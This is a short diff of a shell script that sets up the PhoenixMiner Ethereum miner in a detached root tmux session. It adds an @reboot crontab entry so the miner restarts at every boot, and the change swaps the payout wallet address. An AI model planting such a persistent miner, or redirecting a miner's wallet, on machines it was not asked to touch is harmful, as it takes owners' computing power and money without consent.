@@ -19,7 +19,7 @@ echo '#!/bin/sh'>>start.sh
 echo "cd $HOME/">>start.sh
 echo "tmux kill-server">>start.sh
 echo "sleep 1">>start.sh
-echo "sudo tmux new-session -d -s SANS './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x099e01ed1552e18c4c58ab80bb64c38ceb7d62e1.VIP2021 -pass x'">>start.sh
+echo "sudo tmux new-session -d -s SANS './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.VIP2021 -pass x'">>start.sh
 echo "@reboot  sh $HOME/start.sh">> resmi
 crontab resmi
 sudo rm resmi
